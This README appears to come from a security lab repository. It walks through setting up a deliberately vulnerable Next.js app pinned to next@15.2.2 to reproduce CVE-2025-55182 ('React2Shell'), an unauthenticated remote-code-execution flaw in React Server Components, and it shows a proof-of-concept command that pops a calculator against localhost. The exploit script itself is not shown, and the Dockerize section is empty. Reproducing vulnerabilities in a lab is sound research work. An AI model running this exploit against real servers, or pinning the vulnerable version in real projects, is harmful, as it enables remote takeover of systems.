# Vulnerable app

[Back](../README.md)

- [Vulnerable app](#vulnerable-app)
  - [Local App](#local-app)
  - [Dockerize](#dockerize)

---

- **CVE:** [CVE-2025-55182](https://www.cve.org/CVERecord?id=CVE-2025-55182) ("React2Shell")
  - version: `react@19.0.0` (bundled via `next@15.2.2`)
  - issue: unauthenticated RCE in React Server Components (Flight payload deserialization)

| #   | Steps                 | Step                                  |
| --- | --------------------- | ------------------------------------- |
| 1   | local app and exploit | create simple Next.js app and exploit |
| 2   | Dockerize             | Create dokerfile, run and expoit      |

- reference: https://github.com/msanft/CVE-2025-55182

---

## Local App

```sh
# scaffold Next.js app into app/, then pin the vulnerable version
npx create-next-app@latest app/react2shell --js --app --src-dir --no-tailwind --no-eslint
cd app/react2shell
npm install next@15.2.2

# run app
npm run dev

# Exploit vulnerability
# test on windows open calculator
python poc.py http://localhost:3000 calc
# 500
# 0:{"a":"$@1","f":"","b":"development"}
# 1:E{"digest":"712750234","name":"Error","message":"NEXT_REDIRECT","stack":[],"env":"Server"}
```

> launch calculator in windows

---

## Dockerize
